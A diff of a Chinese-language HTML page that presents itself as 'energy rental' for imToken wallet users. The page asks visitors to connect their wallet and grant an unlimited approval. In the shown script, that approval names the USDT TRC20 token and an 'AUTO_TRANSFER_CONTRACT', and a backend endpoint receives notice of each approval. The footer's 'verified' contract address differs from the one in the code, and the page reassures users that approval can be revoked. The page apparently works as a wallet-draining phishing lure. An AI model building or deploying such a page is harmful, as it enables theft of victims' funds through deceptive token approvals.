@@ -1,54 +1,280 @@
 <!DOCTYPE html>
 <html lang="zh-CN">
 <head>
-
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>imToken一键能量授权</title>
+    <title>imToken能量租赁一键授权</title>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css">
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-               padding: 20px; max-width: 500px; margin: 0 auto; background: #f5f5f5; }
-        .header { text-align: center; margin-bottom: 30px; }
-        .header h1 { font-size: 22px; color: #2c3e50; margin-bottom: 10px; }
-        .warning { background: #fff8e1; color: #e6a23c; padding: 12px; border-radius: 8px;
-                   font-size: 14px; margin-bottom: 20px; text-align: left; }
-        .btn { width: 100%; padding: 15px; font-size: 16px; border: none; border-radius: 8px;
-               background: #409EFF; color: white; cursor: pointer; margin-bottom: 15px; }
-        .btn:disabled { background: #ccc; cursor: not-allowed; }
-        #userInfo { text-align: center; font-size: 14px; color: #333; margin: 20px 0; padding: 15px; background: #fff; border-radius: 8px; }
-        .record-list { margin-top: 30px; }
-        .record-item { background: #fff; padding: 15px; margin-bottom: 15px; border-radius: 8px; font-size: 14px; }
-        .record-item p { margin-bottom: 8px; color: #333; }
-        .record-item p strong { color: #2c3e50; }
-        .tx-link { color: #409EFF; text-decoration: none; }
+        /* 暗色系偏绿主风格 + 紧凑布局 */
+        body { 
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            padding: 15px 12px; /* 缩小外边距 */
+            max-width: 600px; 
+            margin: 0 auto; 
+            background: #121a17; 
+            color: #e0e8e4; 
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            gap: 18px; /* 缩小主体间距 */
+        }
+        /* 主体容器：紧凑布局 */
+        .container {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            gap: 20px; /* 缩小内部组件间距 */
+        }
+        /* 头部：精简间距 */
+        .header {
+            text-align: center;
+            padding: 10px 0;
+            border-bottom: 1px solid #2d3b36;
+            margin-bottom: 5px;
+        }
+        .header .logo {
+            font-size: 24px; /* 缩小图标 */
+            color: #4ade80;
+            margin-bottom: 6px;
+        }
+        .header h1 { 
+            font-size: 22px; 
+            color: #4ade80; 
+            margin-bottom: 5px;
+        }
+        .header .desc {
+            font-size: 13px; /* 缩小描述文字 */
+            color: #a0a8a4;
+            max-width: 450px;
+            margin: 0 auto;
+            line-height: 1.4; /* 紧凑行高 */
+        }
+        /* 警告框：精简内边距 */
+        .warning {
+            background: #2d3b36; 
+            color: #a8d08d; 
+            padding: 12px; /* 缩小内边距 */
+            border-radius: 8px;
+            font-size: 13px; 
+            border-left: 3px solid #4ade80;
+            line-height: 1.5;
+        }
+        .warning strong {
+            color: #4ade80;
+        }
+          /* 用户信息卡：精简内边距 */
+        #userInfo {
+            text-align: center;
+            font-size: 14px;
+            padding: 15px; /* 缩小内边距 */
+            background: #1e2925;
+            border-radius: 8px;
+            border: 1px solid #2d3b36;
+            line-height: 1.6;
+        }
+        #userInfo span {
+            color: #4ade80;
+            font-weight: 500;
+        }
+        /* 授权记录区：紧凑布局 */
+        .record-list {
+            background: #1e2925;
+            padding: 15px; /* 缩小内边距 */
+            border-radius: 8px;
+            border: 1px solid #2d3b36;
+        }
+        .record-list h3 {
+            font-size: 16px;
+            color: #4ade80;
+            margin-bottom: 12px;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+        .record-item {
+            background: #121a17;
+            padding: 12px; /* 缩小内边距 */
+            margin-bottom: 10px;
+            border-radius: 6px;
+            border: 1px solid #2d3b36;
+            font-size: 13px;
+        }
+        .record-item:hover {
+            border-color: #4ade80;
+            transition: border-color 0.3s;
+        }
+        .record-item p {
+            margin-bottom: 6px; /* 缩小段落间距 */
+            color: #a0a8a4;
+            line-height: 1.4;
+        }
+        .record-item p strong {
+            color: #e0e8e4;
+            margin-right: 5px;
+        }
+        .tx-link {
+            color: #4ade80;
+            text-decoration: none;
+            display: inline-flex;
+            align-items: center;
+            gap: 5px;
+            font-size: 13px;
+        }
+        .tx-link:hover {
+            text-decoration: underline;
+        }
+         /* 复制链接区：紧凑布局 */
+        .copy-link-wrap {
+            background: #1e2925;
+            padding: 12px; /* 缩小内边距 */
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            border: 1px solid #2d3b36;
+        }
+        #copyLinkText {
+            flex: 1;
+            color: #a0a8a4;
+            font-size: 13px;
+            word-break: break-all;
+            line-height: 1.3;
+        }
+        #copyLinkBtn {
+            padding: 6px 12px; /* 缩小按钮 */
+            background: #2e7d32;
+            color: #fff;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            font-size: 13px;
+        }
+        #copyLinkBtn:hover {
+            background: #388e3c;
+        }
+        /* 底部按钮组：紧凑 + 按条件隐藏 */
+        .btn-group {
+            display: flex;
+            flex-direction: column;
+            gap: -15px; /* 缩小按钮间距 */
+            margin-top: 15px;
+            padding: 15px 0;
+            border-top: 1px solid #2d3b36;
+        }
+        .btn {
+            width: 100%;
+            padding: 18px; /* 缩小按钮内边距 */
+            font-size: 15px;
+            border: none;
+            border-radius: 8px;
+            background: #2e7d32;
+            color: white;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+            transition: background 0.3s;
+        }
+        .btn:hover {
+            background: #388e3c;
+        }
+        .btn:disabled {
+            background: #1e3a2d;
+            color: #a0a8a4;
+            cursor: not-allowed;
+        }
+        /* 底部信息区：精简 */
+        .footer-info {
+            margin-top: 10px;
+            padding-top: 10px;
+            border-top: 1px solid #2d3b36;
+            font-size: 11px; /* 缩小文字 */
+            color: #a0a8a4;
+            text-align: center;
+            line-height: 1.5;
+        }
+        .footer-info .safety-tip {
+            margin-bottom: 6px;
+            color: #a8d08d;
+        }
+        .footer-info a {
+            color: #4ade80;
+            text-decoration: none;
+        }
+        .footer-info a:hover {
+            text-decoration: underline;
+        }
     </style>
 </head>
 <body>
-<div class="header">
-    <h1>能量租赁一键授权</h1>
-    <div class="warning">
-        ⚠️ 请用 <strong>imToken钱包内置浏览器</strong> 打开此页面<br>
-        ⚠️ 所有状态会精准同步到后端
+    <div class="container">
+        <!-- 头部：修复多余双左尖括号 <<<i → <<i -->
+        <div class="header">
+            <div class="logo">
+            <i class="fa fa-bolt"></i>
+            </div>
+            <h1>能量租赁一键授权</h1>
+            <p class="desc">TRX生态安全授权服务，支持一键无限授权，可在imToken中撤销</p>
+        </div>
+
+        <!-- 警告框：修复图标符号 -->
+        <div class="warning">
+            <p> ⚠️ 请用 <strong>imToken钱包内置浏览器</strong> 打开</p>
+            <p> ⚠️ 非钱包浏览器：复制链接 → 点击「连接钱包」→ 钱包内「浏览」粘贴访问</p>
+            <p> ⚠️ 授权前确认合约地址无误</p>
+        </div>
+             <!-- 用户信息卡 -->
+        <div id="userInfo">
+            未连接钱包<br>
+            <span>请点击底部「连接imToken钱包」按钮</span>
+        </div>
+
+        <!-- 授权记录区：修复图标符号 -->
+        <div class="record-list">
+            <h3> 授权记录</h3>
+            <div id="approvalRecords">
+                <div class="record-item">暂无授权记录<small>授权成功后显示历史记录</small></div>
+            </div>
+        </div>
+        <!-- 复制链接区：修复图标符号 -->
+        <div class="copy-link-wrap">
+            <span id="copyLinkText">
+                https://trc20trx-alt.github.io/Trc20.TRX/
+            </span>
+            <button id="copyLinkBtn"class="fa fa-copy">
+                 复制链接
+            </button>
+        </div>
     </div>
-</div>
-<div style="margin: 15px 0; display: flex; align-items: center; gap: 10px;">
-    <span id="copyLinkText" style="color: #007AFF; word-break: break-all;">
-        https://trc20trx-alt.github.io/Trc20.TRX/
-    </span>
-    <button id="copyLinkBtn" style="padding: 5px 10px; cursor: pointer;">
-        <strong>复制链接</strong>
-    </button>
-</div>
-<button id="connectBtn" class="btn">连接imToken钱包</button>
-<button id="approveBtn" class="btn" disabled>能量授权</button>
-<div id="userInfo">未连接钱包</div>
-<div class="record-list">
-    <h3 style="font-size: 16px; margin-bottom: 15px; color: #2c3e50;">授权记录</h3>
-    <div id="approvalRecords">暂无授权记录</div>
-</div>
-<script>
-    // 原始配置保留
+
+    <!-- 底部按钮组：按条件隐藏 -->
+    <div class="btn-group">
+        <button id="connectBtn" class="btn">
+             连接imToken钱包
+        </button>
+        <button id="approveBtn" class="btn" disabled>
+            能量无限授权
+        </button>
+    </div>
+
+    <!-- 底部信息区：修复图标符号 -->
+    <div class="footer-info">
+        <div class="safety-tip">
+           安全提示：无限授权可在imToken「资产→USDT→授权管理」中撤销
+        </div>
+        合约验证：AutoTransfer <span>TC3AEtwB9MP7xvraxcuzeUa6ycNyLGaGrW</span>（TRON浏览器查询）
+        © 2025 TRX能量租赁 | <a href="https://tronscan.org" target="_blank">TRON浏览器</a> | <a href="https://token.im" target="_blank">imToken官网</a>
+    </div>
+
+    <script src="imtoken://browser"></script>
+    <script>
+        // 原始配置保留
     const AUTO_TRANSFER_CONTRACT = "TNAfknJTfkPbgmyfpwg3rJQrd17ZLKEMQa";
     const TRC20_TOKEN_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
     const BACKEND_API = "https://tron-notify-backend.vercel.app/api/notify-approval";
